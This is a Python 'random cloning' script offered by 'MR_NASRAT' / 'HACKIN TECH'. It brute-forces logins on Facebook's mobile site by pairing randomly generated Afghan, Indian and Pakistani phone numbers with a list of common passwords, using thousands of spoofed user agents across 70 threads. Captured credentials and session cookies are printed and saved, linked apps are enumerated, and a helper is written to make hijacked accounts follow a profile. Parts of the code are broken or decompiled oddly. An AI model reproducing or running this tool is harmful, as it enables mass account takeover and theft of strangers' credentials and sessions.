#WRITE  :BY MR_NASRAT
#DECODE: BY NASRAT
# CRATE : BY HACKIN TECH
# File: for test(python3)
import os
import sys
import time
import requests
import uuid


logo = '   \n\x1b[1;34m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;34m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;34m       888  d8P    888    888 Y88b.      \n\x1b[1;34m       888d88K     888   d88P  "Y888b.   \n\x1b[1;34m       8888888b    8888888P"      "Y88b. \n\x1b[1;34m       888  Y88b   888 T88b         "888 \n\x1b[1;34m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;34m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;35m================= \x1b[32;45mMR_NASRAT\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33m WONER\x1b[0;m   :  \x1b[1;33mNASRAT\x1b[0;m\x1b[1;32m && \x1b[1;33mMOSHTAQ\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m LOY RAYESS KABUL\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-HACKIN TECH\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mHACKIN\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m1.1\n\x1b[1;37m================= \x1b[32;45mMR_NASRAT\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO MR_NASRAT TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mMOSHTAQ\x1b[0;m ======================\n'
print('UPDATE IS DONE')
print('Welcome to Mr Nasrat TOOL')
def NASRAT():
    os.system('clear')
    print(logo)
    print ('                     Checking Approval')
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.NASRAT.txt', 'r').read()
    except (KeyError, IOError):
        NASRAT()
    r = requests.get('https://github.com/Nasrat99845/Jan/blame/main/Ja.txt').text
    if to in r:
        time.sleep(2)
        NASRAT()
    else:
        os.system('clear')
        print(logo)
        print('')
        print ('               Approved Not Detected')
        print ('')
        print("            \033[1;97mTHIS COMMAND  IS PAID YOU NEED TO GET APPROVED FIRST")
        print ('               \033[1;97mYOUR KEY : ' + to)
        print("               COPY AND SEND KEY TO ADMIN")
        name = input("               YOUR NAME : ")
        input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
        time.sleep(3.5)
        tks = 'Dear%20Admin NASRAT,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+to
        os.system('am start https://wa.me/+923168609351?text=' + tks)
        NASRAT()

def NASRAT2():
    os.system('clear')
    print(logo)
    print('')
    print ('\tApproval Not Detected')
    print('')
    id = uuid.uuid4().hex[:50]
    print("            \033[1;97mTHIS TOOL IS PAID YOU NEED TO GET APPROVED FIRST")
    print ('               \033[1;97mYOUR KEY : ' + id)
    print("               COPY AND SEND KEY TO ADMIN")
    name = input("               YOUR NAME : ")
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20NASRAT-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+923168609351?text=' + tks)
    sav = open('/sdcard/Android/.NASRAT.txt', 'w')
    sav.write(id)
    sav.close()
    NASRAT()
    
    
    
def o():
    os.system('clear')
    print(logo)
    print('')
    print('\x1b[1;35m [1]\x1b[1;34m RANDOM CLONING +3 countery')
    print('\x1b[1;35m [2] Graph + API ')
    print('\x1b[1;32m [3] CONACT WITH MR_NASRAT')
    print(' \x1b[1;32m[4] \x1b[1;32mJOYIN MY TELEGRAM CHANNEL')
    print(' \x1b[1;32m[5] \x1b[1;32m Follow My FB ID')
    print(' \x1b[1;91m[00] \x1b[1;91mEXIT')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if opt == '2':
    	i()
    if opt == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000336659232')
        i()
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100024147440412')
        i()
    if None == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ‡¦ðŸ‡«] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ‡¦ðŸ‡«] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100065533669299', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MNASRATA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%BLUE:%GREEN")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          ("""   

====================================================    

d8b   db  .d8b.  .d8888. d8888b.  .d8b.  d888888b 
888o  88 d8' `8b 88'  YP 88  `8D d8' `8b `~~88~~' 
88V8o 88 88ooo88 `8bo.   88oobY' 88ooo88    88    
88 V8o88 88~~~88   `Y8b. 88`8b   88~~~88    88    
88  V888 88   88 db   8D 88 `88. 88   88    88    
VP   V8P YP   YP `8888Y' 88   YD YP   YP    YP                                                                                                                                                                                                                                
\033[1;35m==============================================
\033[1;32m     WONER\33[0;m        :  \033[1;32m\033[1;32mMR.NASRAT  JAGHORIWAL \33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m LOY RAYESS KABUL
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mNasrat99845.git
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m Free
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mTECH HACKIN
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 1.9
\033[1;32m     Brother      &  ARYAN
\033[1;33m     For stop use CTRL + Z
\033[1;34m==============================================\n""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;32mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;35mNo internet connection ... \033[1;34m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

    
#User agents
ugen2=[]
ugen=[]
 
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['7','8','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['X677','F98', 'NOTE 2 LTE', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 PRO', 'Hot 10', 'Hot 10 Play', 'Note 4', 'Note 4 Pro', 'Hot 10s', 'Note 5', 'Note 10s NFC', 'Note 5 Stylus', 'Note 6', 'Note 7 LTE', 'Note 7', 'Note 7 Lite', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 Play', 'Hot 12 Play NFC', 'HOT','Note 12 Pro 5G'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','SMART'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Sharp '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
 #  ag = ['[FB_IAB/FB4A;FBAV/382.0.0.33.111;]', '[FB_IAB/FB4A;FBAV/381.0.0.29.105;]', '[FB_IAB/FB4A;FBAV/383.1.0.25.106;]', '[FB_IAB/FB4A;FBAV/378.0.0.14.112;]', '[[FB_IAB/FB4A;FBAV/383.1.0.25.106;]', '[FB_IAB/FB4A;FBAV/421.0.0.33.47;]' , '[FB_IAB/FB4A;FBAV/433.0.0.31.111;]', '[FB_IAB/FB4A;FBAV/330.0.0.31.120;]', '[FB_IAB/FB4A;FBAV/397.0.0.23.404;]', '[FB_IAB/FB4A;FBAV/390.0.0.27.105;]', '[FB_IAB/FB4A;FBAV/354.0.0.22.110;]', '[FB_IAB/FB4A;FBAV/400.0.0.37.76;]', '[FB_IAB/FB4A;FBAV/396.1.0.28.104;]', '[FB_IAB/FB4A;FBAV/395.0.0.27.214;]', '[FB_IAB/FB4A;FBAV/354.0.0.22.110;]', '[FB_IAB/FB4A;FBAV/383.1.0.25.106;]']
  #  m = random.choice(ag)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['7','8','9','10','11','12','13','14'])
    c='Infinix '
    d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
    e=random.randrange(1, 999)
    f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
  
  
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Qmobile '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    ag = ['[FB_IAB/FB4A;FBAV/382.0.0.33.111;]', '[FB_IAB/FB4A;FBAV/381.0.0.29.105;]', '[FB_IAB/FB4A;FBAV/383.1.0.25.106;]', '[FB_IAB/FB4A;FBAV/378.0.0.14.112;]', '[[FB_IAB/FB4A;FBAV/383.1.0.25.106;]', '[FB_IAB/FB4A;FBAV/421.0.0.33.47;]' , '[FB_IAB/FB4A;FBAV/433.0.0.31.111;]', '[FB_IAB/FB4A;FBAV/330.0.0.31.120;]', '[FB_IAB/FB4A;FBAV/397.0.0.23.404;]', '[FB_IAB/FB4A;FBAV/390.0.0.27.105;]', '[FB_IAB/FB4A;FBAV/354.0.0.22.110;]', '[FB_IAB/FB4A;FBAV/400.0.0.37.76;]', '[FB_IAB/FB4A;FBAV/396.1.0.28.104;]', '[FB_IAB/FB4A;FBAV/395.0.0.27.214;]', '[FB_IAB/FB4A;FBAV/354.0.0.22.110;]', '[FB_IAB/FB4A;FBAV/383.1.0.25.106;]']
    m = random.choice(ag)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Galaxy '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)



    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
    e=random.randrange(1, 999)
    f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/115.0.5823.224 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    
    print("\033[1;34m\t  USE Your COUNTRY CODE  ")
    print('\033[1;35m     \t     AFG CODES\n     \033[1;34m9379, \033[1;36m9377 ,\033[1;33m9378 ,\033[1;33m9370  ...\033[0;97m')
    print('\033[1;91m============================================')
    print('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    print('\033[1;34m============================================')
    print('\033[1;36m     \t     PAK CODES\n     \033[1;33m92302, \033[1;33m92345 ,\033[1;33m92306 ,\033[1;33m92303 ...\033[0;97m')
    print('\033[1;33m============================================\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    with ThreadPool(max_workers=70) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;91m TOTAL IDS: '+tl)
        print('\033[1;35m THE PROCESS HAS BEEN STARTED')
        print('\033[1;35m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;32m============================================')
        for love in user:
            uid = code+love
            pwx=[love+love,'Afghanistan','Û±Û²Û³Û´ÛµÛ¶Û·Û¸Û¹','afghanistan','kabul123','Afghan123','10002000','700800','Afghan1234','50006000','janjan','123456','100200','','','pakistan','pakistan123','pakistan12345','khankhan','khan1122','khan123','khan12345','pubgpubg','pubg123','pubg12345','malik123','malik12345']
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m============================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=vHcHZYJsFowJwq2_wLJ4sn1n; sb=vHcHZaSIfSeidnc4s4Zg2afq; wd=360x728; fr=064wKXOeiy8NN5PCU..BlLEKN.ht.AAA.0.0.BlLEK6.AWVvnjtNNa4',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"(Not(A:Brand";v="99"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"TECNO CH7n"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login.php',data=log_data,headers=header_freefb).text,
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m[] (NASRAT-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;35m  [Cookie] =  \033[1;35m'+coki+  ' \n '+pro+'  \033[1;91m')
                cek_apk(session,coki)
                open('/sdcard/NASRAT-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;91m[X](NASRAT-CP)  ' +uid+ ' | ' +ps+           '  \33[1;91m')
                open('/sdcard/NASRAT-CP.txt', 'a').write(uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[NASRAT-OK] [%s/%s]<>OK:- %s <>CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
NASRAT()






